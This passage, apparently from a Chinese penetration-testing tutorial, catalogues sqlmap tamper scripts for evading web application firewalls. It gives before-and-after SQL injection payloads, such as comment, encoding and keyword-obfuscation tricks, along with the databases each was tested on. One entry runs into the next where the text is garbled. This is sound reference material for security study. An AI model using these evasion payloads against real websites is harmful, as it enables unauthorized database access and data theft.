    '1%23%0AAND%23%0A9227=9227'
版本要求:
    MSSQL
    MySQL
**6:modsecurityversioned.py**
作用：过滤空格，包含完整的查询版本注释
示例：
    '1 AND 2>1--'
    '1 /*!30874AND 2>1*/--'
版本要求:
    MySQL
    在以下版本做过测试:
    MySQL 5.0
**7:space2comment.py**
作用：`Replaces space character (‘ ‘) with comments ‘/**/’`
示例：
    SELECT id FROM users 
    SELECT//id//FROM/**/users
在以下版本做过测试:
    Microsoft SQL Server 2005
    MySQL 4, 5.0 and 5.5
    Oracle 10g
    PostgreSQL 8.3, 8.4, 9.0
**8:space2mysqldash.py**
作用：用`–%0A`替换空格
注：之前有个`mssql`的 这个是`mysql`的
示例：
    '1 AND 9227=9227'
    '1--%0AAND--%0A9227=9227'
版本要求:
    MySQL
    MSSQL
**9:space2plus.py**
作用：用+替换空格
示例：
    'SELECT id FROM users'
    'SELECT+id+FROM+users'
在以下版本做过测试:
All
**10:bluecoat.py**
作用：代替空格字符后与一个有效的随机空白字符的`SQL`语句。 然后替换`=为like`
示例：
    'SELECT id FROM users where id = 1'
    'SELECT%09id FROM users where id LIKE 1'
在以下版本做过测试:
    MySQL 5.1, SGOS
**11:space2randomblank.py**
作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集
示例：
    'SELECT id FROM users'
    'SELECT%0Did%0DFROM%0Ausers'
在以下版本做过测试:
All
**12:sp_password.py**
作用：追加`sp_password’`从DBMS日志的自动模糊处理的有效载荷的末尾
示例：
    '1 AND 9227=9227-- '
    '1 AND 9227=9227-- sp_password'
版本要求: `* MSSQL`
#### 针对过滤引号的：
**1:apostrophemask.py**
作用：用`utf8`代替单引号
示例：
    "1 AND '1'='1"
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
在以下版本做过测试:
all
**2:apostrophenullencode.py**
作用：绕过过滤双引号，替换字符和双引号。
示例：
    "1 AND '1'='1"
    '1 AND %00%271%00%27=%00%271'
在以下版本做过测试:
    MySQL 4, 5.0 and 5.5
    Oracle 10g
    PostgreSQL 8.3, 8.4, 9.0
#### 针对过滤关键字的：
**1:halfversionedmorekeywords.py**
作用：当数据库为`mysql`时绕过防火墙，每个关键字之前添加`mysql`版本评论
示例：
    ("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa") "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
版本要求:
    MySQL ’ ,用GREATEST替换大于号。
示例：
    '1 AND A > B'
    '1 AND GREATEST(A,B+1)=A'
在以下版本做过测试:
    MySQL 4, 5.0 and 5.5
    Oracle 10g
    PostgreSQL 8.3, 8.4, 9.0
**3:between.py**
作用：用between替换大于号（>）
示例：
    '1 AND A > B--'
    '1 AND A NOT BETWEEN 0 AND B--'
在以下版本做过测试:
    Microsoft SQL Server 2005 MySQL 4, 5.0 and 5.5
    Oracle 10g
    PostgreSQL 8.3, 8.4, 9.0
#### 其他类型：
**1:versionedmorekeywords.py**
作用：注释绕过
示例：
    1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
    1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
版本要求:
    MySQL >= 5.1.13
**2:securesphere.py**
作用：追加特制的字符串
示例：
    '1 AND 1=1'
    "1 AND 1=1 and '0having'='0having'"
在以下版本做过测试:
All
**3:charunicodeencode.py**
作用：字符串 unicode 编码
示例：
    SELECT FIELD%20FROM TABLE
    %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
版本要求:
    ASP
    ASP.NET
    在以下版本做过测试:
    Microsoft SQL Server 2000
    Microsoft SQL Server 2005
    MySQL 5.1.56
    PostgreSQL 9.0.3
**4:charencode.py**
作用：url编码
示例：
    SELECT FIELD FROM%20TABLE
    %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
在以下版本做过测试:
    Microsoft SQL Server 2005
    MySQL 4, 5.0 and 5.5
    Oracle 10g
    PostgreSQL 8.3, 8.4, 9.0
**5:appendnullbyte.py**
作用：在有效负荷结束位置加载零字节字符编码
    ‘1 AND 1=1’
    ‘1 AND 1=1%00’
版本要求:
    Microsoft Access
**6:chardoubleencode.py**
作用: 双url编码(不处理以编码的)
示例：
    SELECT FIELD FROM%20TABLE 
    %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
**7:base64encode.py**
作用：用`base64`编码替换
示例：
    "1' AND SLEEP(5)#"
    'MScgQU5EIFNMRUVQKDUpIw=='
版本要求:
all
**8:nonrecursivereplacement.py**
作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)）
filters
示例：
    '1 UNION SELECT 2--'
    '1 UNIOUNIONN SELESELECTCT 2--'
在以下版本做过测试:
    all
后续内容将会继续更新。。。。。。。。。
参考资料：
安全牛课堂-kali-linux-web篇
sqlmap用户手册中文版：
sqlmap用户手册：